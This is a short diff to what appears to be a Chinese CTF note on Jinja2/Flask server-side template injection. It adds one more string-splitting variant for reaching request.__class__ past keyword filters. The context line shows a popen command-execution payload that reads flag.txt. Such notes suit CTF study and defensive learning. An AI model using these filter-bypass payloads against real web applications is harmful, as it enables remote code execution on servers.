@@ -238,6 +238,7 @@ popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()
 等效：
 request.__class__
 request["__class__"]
+request["__cla""ss__"]
 request["__cla"+"ss__"]
 request|attr("__class__")
 
